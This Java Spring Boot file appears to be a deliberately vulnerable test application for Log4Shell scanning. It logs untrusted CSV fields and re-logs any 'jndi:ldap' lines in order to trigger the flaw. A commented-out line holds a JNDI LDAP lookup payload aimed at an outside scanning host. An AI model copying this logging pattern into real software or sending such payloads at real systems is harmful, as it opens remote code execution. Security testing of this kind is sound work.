package com.datatheorem.logproc;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.time.LocalDate;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import com.opencsv.CSVReaderHeaderAware;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.boot.ApplicationArguments;
import org.springframework.boot.ApplicationRunner;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;


@SpringBootApplication
public class LogProcApplication implements ApplicationRunner {
    private static final Logger logger = LogManager.getLogger(LogProcApplication.class);

    public static void main(String[] args) {
        SpringApplication.run(LogProcApplication.class, args);
    }

    @Override
    public void run(ApplicationArguments applicationArguments) throws Exception {
        logger.debug("Debugging log ${java:runtime}");
        //logger.info("Info log ${jndi:ldap://log4shell.scans.securetheorem.com:80/unique-marker}");
 
        String journalPath = "../journal/";
        String logFile     = "../logs/log.txt";
        String logDate = LocalDate.now().toString(); // TODO: Use UTC

        // process command-line arguments
        try {
            if(applicationArguments.containsOption("journalPath")) {
                journalPath = applicationArguments.getOptionValues("journalPath").get(0);
            }
            if(applicationArguments.containsOption("logFile")) {
                logFile = applicationArguments.getOptionValues("logFile").get(0);
            }
            if(applicationArguments.containsOption("date")) {
                logDate = applicationArguments.getOptionValues("date").get(0);
            }
        }
        catch (IndexOutOfBoundsException e) {
            logger.debug("Exception processing command-line arguments:\n" + e.getMessage());
            System.out.println("Error processing command-line arguments. Usage: logproc [--journalPath=<path-to-journal-files>] [--logFile=<filename>] [--date=<YYYY-MM-DD>]");
        }
        
        logger.info("Journal Path:" + journalPath + "; Log Path: " + logFile + "; Date: " + logDate);

        // open visitor log file and process it
        List<VisitorEntry> records = new ArrayList<>();
        String fileName = journalPath + "visitor-log-" + logDate + ".csv";
        logger.info("Opening file " + fileName + " for reading");

        try (FileReader f = new FileReader(fileName)) {
            // read each line except the header into values            
            Map<String, String> values;
            try {
                CSVReaderHeaderAware csvReader = new CSVReaderHeaderAware(f);
                values = csvReader.readMap();
                while( values != null ) {
                    // create VisitorEntry and add to the list
                    VisitorEntry v = new VisitorEntry(values);
                    records.add(v);

                    // THIS will trigger Log4Shell vulnerability if present in the record
                    try {
                        logger.warn(values.toString());
                    }
                    catch (Exception e) {
                        logger.debug("Exception logging visitor entry:\n" + e.getMessage());
                    }
                    values = csvReader.readMap();
                }
                csvReader.close();
            }
            catch (Exception e) {
                logger.debug("Exception processing CSV file:\n" + e.getMessage());
            }
            
            if(records.isEmpty()) {
                System.out.println("No visitors left messages on " + logDate);
            } else {
                System.out.println(records.size() + " visitors left messages on " + logDate + ":");
                for (VisitorEntry v : records) {
                    System.out.println(v.getFName() + " " + v.getLName() + " from " + v.getCity() + ", " + v.getState() + " (" + v.getCountry() + ")");
                }
            }
        }
        catch (IOException e) {
            logger.debug("Exception opening visitor log file:\n" + e.getMessage());
        }
        catch (Exception e) {
            logger.debug("Exception processing visitor log file:\n" + e.getMessage());
        }

        // Look through system logs for jndi messages
        try (BufferedReader r = new BufferedReader(new FileReader(logFile))) {
            String logLine = r.readLine();
            while(logLine != null) {
                if(logLine.toLowerCase(Locale.US).indexOf("jndi:ldap") >= 0) {
                    // print one if found to trigger Log4Shell
                    try {
                        logger.error(logLine);
                    }
                    catch (Exception e) {
                        logger.debug("Exception while logging potentially malicious input:\n" + e.getMessage());
                    }
                }
                logLine = r.readLine();
            }
        }
        catch (IOException e) {
            logger.debug("Exception opening system log file:\n" + e.getMessage());
        }
        catch (Exception e) {
            logger.debug("Exception reading or handling system log file:\n" + e.getMessage());
        }
    }
}
